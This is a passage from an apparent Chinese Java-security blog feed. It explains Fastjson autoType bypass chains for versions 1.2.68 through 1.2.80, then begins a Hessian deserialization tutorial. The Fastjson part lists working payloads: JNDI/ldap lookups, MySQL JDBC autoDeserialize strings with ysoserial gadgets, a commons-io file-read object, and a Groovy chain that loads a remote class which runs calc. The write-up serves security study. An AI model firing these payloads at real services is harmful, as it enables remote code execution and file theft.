class="string">&quot;:&quot;</span>java.util.Properties<span class="string">&quot;,&quot;</span>UserTransaction<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-68-要有依赖"><a href="#Fastjson-x3D-1-2-68-要有依赖" class="headerlink" title="Fastjson &#x3D; 1.2.68(要有依赖)"></a><strong>Fastjson &#x3D; 1.2.68</strong>(要有依赖)</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影 响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验:</p><p>expectClass为空:</p><ol><li>typeNmae不在denyHashCodes黑名单中(必须条件)</li><li>SafeMode为false(必要条件，默认为false)</li><li>typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为</li></ol><p>expectClass子类 expectClass不为空:</p><ol><li>typeNmae和expectClass均不在denyHashCodes黑名单中(必须条件)</li><li>autoTypeSupport为false(默认为false)</li><li>expectClass在TypeUtils#mappings中</li><li>typeName不是ClassLoader、DataSource、RowSet的子类</li><li>expectClass不为null，且不为Object.class、Serializable.class、Cloneable.class、</li></ol><p>Closeable.class、EventListener.class、Iterable.class、Collection.class</p><ol start="6"><li>typeName是expectClass的子类</li></ol><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x.xx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>ServerStatusDiffInterceptor链</p><ul><li>5.1.0-5.1.10:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc 连接后需执行查询 </li><li>5.1.11-5.x.xx:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc (包名中添加cj)</li><li>8.0.20以下:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li></ul><p>detectCustomCollations链</p><ul><li>5.1.19-5.1.28:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.40:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.41 以上 不可用</li></ul><p>利用链分析</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**queryInterceptors:**一个逗号分割的Class列表(实现了 com.mysql.cj.interceptors.QueryInterceptor接口的Class)，在Query&quot;之间&quot;进行执行来影响结 果。(效果上来看是在Query执行前后各插入一次操作) **autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。</span><br></pre></td></tr></table></figure></div><p>detectCustomCollations链:</p><ul><li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.11及以上的5.x版本(包名没有了cj): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollations触发:</li><li>5.1.41及以上: 不可用</li><li>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.28-5.1.19: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.18以下的5.1.x版本: 不可用 </li><li>5.0.x版本不可用</li><li>5.1.41版本后，不再使用getObject()获取”SHOW COLLATION”的结果，此链失效</li></ul><p>ServerStatusDiffInterceptor链:</p><p>payload 5.1.11-5.1.48</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections5&quot;</span><span class="punctuation">,</span> <span class="comment">// 利用链 </span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span> </span><br><span class="line">      <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>payload 6.0.2&#x2F;6.0.3</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span> </span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>6.0.4中构造方法改变，此利用链无法使用</p></blockquote><p>payload 8.0.19</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"><span class="string">&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><h4 id="文件写入读取"><a href="#文件写入读取" class="headerlink" title="文件写入读取"></a>文件写入读取</h4><p>依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///D:/1.txt&quot;</span><span class="comment">//此处传入URL,则此处可使用file jar http 等协议</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">66</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>这里用了FastJSON的特性<code>&quot;$ref&quot;&quot;: &quot;$.xx.yy&quot;</code>表示调用JSON对象中xx的yy属性的getter。payload中即调用 abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的 getBOM()方法。</p></blockquote><h2 id="1-2-72-lt-Fastjson-lt-x3D-1-2-80"><a href="#1-2-72-lt-Fastjson-lt-x3D-1-2-80" class="headerlink" title="1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a><strong>1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</strong></h2><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单 中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p><p>依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>利用隐式类关系将 org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、 org.codehaus.groovy.control.CompilerConfiguration加入到maping中 <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="number">2.</span>利用链加载远程类 <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;classpath&quot;</span><span class="punctuation">:</span><span class="string">&quot;url地址xxx&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>服务器配置:<br> 新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation 文件内容为MyExction<br> http根目录放置MyExction.class</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"><span class="meta">@GroovyASTTransformation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExction</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> &#123; <span class="keyword">try</span> &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var1);</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian反序列化</title>
      <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian-反序列化"><a href="#Hessian-反序列化" class="headerlink" title="Hessian 反序列化"></a>Hessian 反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocol，远程过程调用协议，和 RMI（Remote Method Invocation，远程方法调用）类似，都能通过网络调用远程服务，但 RPC 是以标准的二进制格式来定义请求的信息，可用实现跨语言和跨操作系统通讯。</p><p>通讯过程：</p><p>1.客户端发起请求，并按照 RPC 协议格式填充信息<br>2.填充完毕后将二进制格式文件转化为流，通过传输协议进行传输<br>3.服务端接收到流后，将其转换为二进制格式文件，并按照 RPC 协议格式获取请求信息并进行处理<br>4.处理完毕后将结果按照 RPC 协议格式写入二进制格式文件中并返回</p><p>maven 添加扩展：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="Hessian反序列化与原生反序列化的区别"><a href="#Hessian反序列化与原生反序列化的区别" class="headerlink" title="Hessian反序列化与原生反序列化的区别"></a>Hessian反序列化与原生反序列化的区别</h3><p>示例类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Code</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;ttt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age=<span class="number">222</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span>&#123;</span><br><span class="line">        System.out.print(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>原生序列化反序列化</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span 